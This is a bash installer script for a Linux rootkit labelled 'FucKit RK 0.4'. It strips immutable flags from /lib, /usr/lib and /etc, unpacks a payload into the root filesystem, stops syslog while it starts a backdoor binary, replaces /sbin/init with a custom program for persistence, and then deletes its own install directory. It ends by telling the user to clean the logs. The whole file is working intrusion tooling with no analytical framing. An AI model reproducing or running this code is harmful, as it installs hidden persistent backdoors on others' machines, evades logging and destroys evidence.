#!/bin/bash

WHITE="echo -en \\033[1;37m"
NORMAL="echo -en \\033[0;37m"
BLUE="echo -en \\033[1;34m"
RED="echo -en \\033[1;31m"

$WHITE
echo "##########################################"
echo "######### FucKit RK 0.4 by Cyrax #########"
echo "##########################################"
echo 
$BLUE
echo -n "Preparing to install ...."
chattr -ia /usr/lib/*
chattr -ia /lib/*
chattr -ia /etc/*
$WHITE
echo " done!"
$BLUE
echo -n "Phase #1: Unpacking & installing filez..."
tar -zxf filez.tgz -C /
$WHITE
echo " done!"
$BLUE
echo "Phase #2: Killing system loggers."
$NORMAL
/sbin/service syslog stop
$BLUE
echo -n "Phase #3: Starting backdoor..."
/dev/proc/fuckit/hax0r 
$WHITE
echo " done!"
$BLUE
if [ -f /dev/proc/fuckit/system-bins/init ]; then
	$RED
	echo "Install: Detected previous installation."
	echo "Install: Skipping phase #4."
else
	echo "Phase #4.1: Copying /sbin/init to /dev/proc/fuckit/system-bins/ ."
	cp /sbin/init /dev/proc/fuckit/system-bins
	echo -n "Phase #4.2: Overwriting /sbin/init with custom program ..."
	rm -rf /sbin/init
	cp ./init /sbin/init
fi
$WHITE
echo " done!"
$BLUE
echo "Phase #5: Restarting system loggers."
$NORMAL
/sbin/service syslog start
$BLUE
echo "Postinstall settings."
$NORMAL
echo "-=- Removing `pwd` ."
cp README /dev/proc/fuckit
cp CHANGES /dev/proc/fuckit
rm -rf `pwd`
echo "-=- Moving `pwd`/fk.tgz to /dev/proc/fuckit ( in case u need it )"
cp ../fk.tgz /dev/proc/fuckit
$WHITE
echo "######## Installation completed! ########"
echo 
$RED
echo "Ya n0w 0wn this b0x3n! ...."
echo "Dont forget to clean the logs, this RK version does not include a logcleanner!"


